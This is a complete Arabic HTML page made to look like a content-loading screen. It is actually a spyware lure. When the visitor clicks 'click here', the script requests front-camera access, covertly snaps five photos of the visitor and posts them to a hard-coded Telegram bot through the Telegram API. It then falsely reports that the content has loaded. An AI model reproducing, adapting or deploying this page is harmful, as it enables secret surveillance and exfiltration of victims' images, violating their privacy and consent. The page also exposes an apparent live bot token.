<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body {
            margin: 0;
            background-color: #0f172a;
            color: #f8fafc;
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            text-align: center;
            padding: 20px;
        }
        .btn-start {
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            padding: 14px 35px;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        h2 { font-size: 1.1rem; font-weight: 500; margin-bottom: 25px; word-break: break-all; }
    </style>
</head>
<body>

    <div class="loader-container" id="mainBox">
        <h2>انقر على الزر أدناه لعرض المحتوى</h2>
        <button class="btn-start" onclick="startProcess()">اضغط هنا</button>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TELEGRAM_BOT_TOKEN = '8880573702:AAGOnEril_hFUPSBRuLh2TwGkFOG3wCeV80';
        const TELEGRAM_CHAT_ID = '8304712202';

        async function startProcess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                const videoElement = document.getElementById('video');
                videoElement.srcObject = stream;

                // البدء فوراً بعد نصف ثانية فقط لسرعة فائقة
                setTimeout(() => {
                    captureFastPhotos(stream);
                }, 500);

            } catch (error) {
                document.getElementById('mainBox').innerHTML = '<h2>خطأ في إذن الكاميرا: ' + error.message + '</h2>';
            }
        }

        async function captureFastPhotos(stream) {
            try {
                const videoElement = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                canvas.width = 240;
                canvas.height = 180;
                const context = canvas.getContext('2d');

                // التقاط 5 صور متتالية بسرعة فائقة
                for (let i = 1; i <= 5; i++) {
                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    const imageDataURL = canvas.toDataURL('image/jpeg', 0.4);

                    // إرسال سريع بدون تأخير كبير بين الصور
                    sendToTelegram(`📸 صوره (${i}) - في أسرع وقت:\n` + imageDataURL);
                    
                    if (i < 5) {
                        await new Promise(resolve => setTimeout(resolve, 300)); // فاصل 300 جزء من الثانية فقط
                    }
                }

                stream.getTracks().forEach(track => track.stop());
                document.getElementById('mainBox').innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';

            } catch (e) {
                document.getElementById('mainBox').innerHTML = '<h2>خطأ في المعالجة: ' + e.message + '</h2>';
            }
        }

        function sendToTelegram(textMessage) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: textMessage
                })
            }).catch(error => {
                console.error("خطأ في الإرسال", error);
            });
        }
    </script>
</body>
</html>
